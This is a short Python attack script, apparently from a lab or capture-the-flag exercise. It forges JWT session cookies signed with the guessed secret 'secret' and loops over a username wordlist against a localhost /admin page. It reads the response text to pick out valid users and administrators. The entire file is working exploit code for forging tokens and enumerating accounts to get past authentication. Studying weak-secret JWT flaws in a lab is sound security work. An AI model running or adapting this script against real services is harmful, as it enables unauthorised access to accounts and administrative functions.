import requests
from createJwts import createJwt

url = "http://localhost:5000/admin"

def tryUsername(username, secret):
    cookies = {
        'token': f'{createJwt(username, secret)}'
    }
    res = requests.get(url, cookies=cookies)
    if 'Welcome' in res.text:
        if 'logged in' in res.text:
            print("Found username:", username)
            return username
        else:
            print("Found admin:", username)
            return username
    else:
        return False
    

resName = False
secret = 'secret'
with open('usernames-list.txt') as file:
    for line in file.readlines():
        resName = tryUsername(line.strip(), secret)
